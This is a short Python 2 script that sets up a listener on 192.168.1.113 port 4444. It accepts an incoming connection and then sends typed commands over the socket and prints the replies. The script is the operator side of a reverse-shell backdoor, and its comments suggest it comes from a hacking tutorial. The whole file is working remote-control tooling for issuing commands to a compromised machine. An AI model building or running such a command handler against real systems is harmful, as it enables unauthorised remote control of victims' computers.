#!/usr/bin/env python

import socket


class Listener:
    def __init__(self, ip, port):  # initialise the function
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create socket
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # allows to reuse the socket
        listener.bind((ip, port))  # bind socket to our computer to listen to connections to port
        listener.listen(0)
        print("[+] Waiting for incoming connections.")
        self.connection, address = listener.accept()  # self.* convert it to an attribute, use it within the class
        print("[+] You've got a connection! " + str(address))

    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input(">> ")  # python 3 is input instead of raw_input
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("192.168.1.113", 4444)
my_listener.run()
